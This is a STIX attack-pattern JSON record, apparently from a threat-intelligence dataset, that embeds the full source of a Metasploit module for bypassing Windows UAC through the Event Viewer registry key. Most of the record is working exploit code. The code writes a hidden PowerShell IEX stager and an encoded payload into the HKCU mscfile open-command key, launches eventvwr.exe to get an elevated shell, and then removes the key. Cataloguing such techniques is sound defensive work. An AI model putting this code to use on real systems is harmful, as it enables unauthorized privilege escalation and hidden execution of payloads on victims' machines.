{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d0f4a0b-3ed0-4991-833c-682a3fe993bc",
    "created": "2024-08-14T16:50:02.410892Z",
    "modified": "2024-08-14T16:50:02.410896Z",
    "name": "Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)",
    "description": " This module will bypass Windows UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows Event Viewer is launched. It will spawn a second shell that has the UAC flag turned off.  This module modifies a registry key, but cleans up the key once the payload has been invoked.  The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_eventvwr.rb",
            "external_id": "bypassuac_eventvwr.rb"
        },
        {
            "source_name": "reference",
            "url": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::Powershell\n  include Post::Windows::Priv\n  include Post::Windows::Registry\n  include Post::Windows::Runas\n\n  EVENTVWR_DEL_KEY = 'HKCU\\\\Software\\\\Classes\\\\mscfile'.freeze\n  EVENTVWR_WRITE_KEY = 'HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command'.freeze\n  EXEC_REG_VAL = ''.freeze # This maps to \"(Default)\"\n  EXEC_REG_VAL_TYPE = 'REG_SZ'.freeze\n  EVENTVWR_PATH = '%WINDIR%\\\\System32\\\\eventvwr.exe'.freeze\n  EVENTVWR_WOW64_PATH = '%WINDIR%\\\\SysWOW64\\\\eventvwr.exe'.freeze\n  PSH_PATH = '%WINDIR%\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe'.freeze\n  CMD_MAX_LEN = 2081\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)',\n        'Description' => %q{\n          This module will bypass Windows UAC by hijacking a special key in the Registry under\n          the current user hive, and inserting a custom command that will get invoked when\n          the Windows Event Viewer is launched. It will spawn a second shell that has the UAC\n          flag turned off.\n\n          This module modifies a registry key, but cleans up the key once the payload has\n          been invoked.\n\n          The module does not require the architecture of the payload to match the OS. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting your\n          payload in a separate process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Matt Nelson', # UAC bypass discovery and research\n          'Matt Graeber',   # UAC bypass discovery and research\n          'OJ Reeves'       # MSF module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/'],\n          ['URL', 'https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1']\n        ],\n        'DisclosureDate' => '2016-08-15',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win10_1607)\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    eventvwr_cmd = EVENTVWR_PATH\n    registry_view = REGISTRY_VIEW_NATIVE\n\n    # Make sure we have a sane payload configuration\n\n    if session.arch != target.arch.first\n      fail_with(Failure::NoTarget, 'Session and Target arch must match')\n    end\n    if sysinfo['Architecture'] == ARCH_X64\n      vprint_status('Target is x64')\n      if session.arch == ARCH_X86\n        vprint_status('Detected Target/Session mismatch.  Syswow Required.')\n        registry_view = REGISTRY_VIEW_64_BIT\n        eventvwr_cmd = EVENTVWR_WOW64_PATH\n      end\n    elsif target_arch.first == ARCH_X64\n      # if we're on x86, we can't handle x64 payloads\n      fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')\n    end\n\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    check_permissions!\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    payload_value = rand_text_alpha(8)\n    psh_path = expand_path(PSH_PATH.to_s)\n    template_path = Rex::Powershell::Templates::TEMPLATE_DIR\n    vprint_status(\"template_path #{template_path}\")\n    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, payload.encoded)\n\n    psh_stager = \"\\\"IEX (Get-ItemProperty -Path #{EVENTVWR_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\\\"\"\n    cmd = \"#{psh_path} -nop -w hidden -c #{psh_stager}\"\n\n    existing = registry_getvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, registry_view) || ''\n\n    if existing.empty?\n      registry_createkey(EVENTVWR_WRITE_KEY, registry_view)\n    end\n\n    print_status('Configuring payload and stager registry keys ...')\n    registry_setvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)\n    registry_setvaldata(EVENTVWR_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)\n\n    cmd_path = expand_path(eventvwr_cmd.to_s)\n    print_status(\"Executing payload: #{cmd_path}\")\n    result = client.railgun.shell32.ShellExecuteA(nil, 'open', cmd_path, nil, nil, 'SW_HIDE')\n\n    if result['return'] > 32\n      print_good('eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.')\n      Rex.sleep(10)\n    else\n      print_error(\"eventvwr.exe execution failed with Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}\")\n    end\n\n    handler(client)\n\n    print_status('Cleaning up registry keys ...')\n    if existing.empty?\n      registry_deletekey(EVENTVWR_DEL_KEY, registry_view)\n    else\n      registry_setvaldata(EVENTVWR_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)\n      registry_deleteval(EVENTVWR_WRITE_KEY, payload_value, registry_view)\n    end\n  end\n\n  def check_permissions!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n\n    unless is_in_admin_group?\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    print_status('UAC is Enabled, checking level...')\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-15",
    "x_mitre_platforms": [
        "['win']"
    ]
}